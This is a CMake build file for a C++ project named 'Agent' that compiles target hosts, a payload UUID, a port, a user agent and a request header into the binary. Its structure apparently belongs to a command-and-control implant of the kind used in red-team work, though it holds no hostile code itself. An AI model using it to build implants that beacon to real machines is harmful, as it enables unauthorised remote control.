# CMakeList.txt : CMake project for Agent, include source and define
# project specific logic here.
#
cmake_minimum_required (VERSION 3.10)

# Enable Hot Reload for MSVC compilers if supported.
if (POLICY CMP0141)
  cmake_policy(SET CMP0141 NEW)
  set(CMAKE_MSVC_DEBUG_INFORMATION_FORMAT "$<IF:$<AND:$<C_COMPILER_ID:MSVC>,$<CXX_COMPILER_ID:MSVC>>,$<$<CONFIG:Debug,RelWithDebInfo>:EditAndContinue>,$<$<CONFIG:Debug,RelWithDebInfo>:ProgramDatabase>>")
endif()

project (Agent)

# Hosts List Configuration
set(INPUT_HOSTS "localhost" CACHE STRING "List of target host addresses")
string(STRIP "${INPUT_HOSTS}" INPUT_HOSTS)
string(REPLACE ";" "\", L\"" HOSTS_INITIALIZER \"${INPUT_HOSTS}\")
set(WIDE_HOSTS_LIST "L${HOSTS_INITIALIZER}")

# Payload UUID Configuration
set(INPUT_PAYLOAD_UUID "3de5beb2-3e4c-4864-804e-15f8157cb456" CACHE STRING "The payload unique identifier")

# Port Configuration
set(PORT 5069 CACHE STRING "The primary target connection port")
string(STRIP "${PORT}" CLEAN_PORT)

# User Agent Configuration
set(INPUT_USER_AGENT "Trinity Agent Client/1.0" CACHE STRING "The user agent for requests")

# Agent Header Configuration
set(INPUT_REQUEST_HEADER "Content-Type: application/json\r\n" CACHE STRING "The agent request header")

# Add source to this project's executable.
add_executable (
  Agent 
  "src/main.cpp" 
  "src/CommManager.cpp"
  "include/CommManager.h"
  "include/base64.hpp"
  "src/CommandDispatcher.cpp"
  "include/CommandDispatcher.h"
  "src/Agent.cpp"
  "include/Agent.h"
  "src/TaskQueueManager.cpp"
  "include/TaskQueueManager.h"
  "include/Task.h"
  "include/Command.h"
)

target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
target_include_directories(Agent PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/include)
target_include_directories(Agent PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/src)
target_compile_definitions(Agent PRIVATE COMM_HOSTS_LIST=${WIDE_HOSTS_LIST})
target_compile_definitions(Agent PRIVATE COMM_PAYLOAD_UUID="${INPUT_PAYLOAD_UUID}")
target_compile_definitions(Agent PRIVATE COMM_USER_AGENT="${INPUT_USER_AGENT}")
target_compile_definitions(Agent PRIVATE COMM_PORT=${CLEAN_PORT})
target_compile_definitions(Agent PRIVATE COMM_REQUEST_HEADER="${INPUT_REQUEST_HEADER}")


if (CMAKE_VERSION VERSION_GREATER 3.12)
  set_property(TARGET Agent PROPERTY CXX_STANDARD 20)
endif()

# TODO: Add tests and install targets if needed.
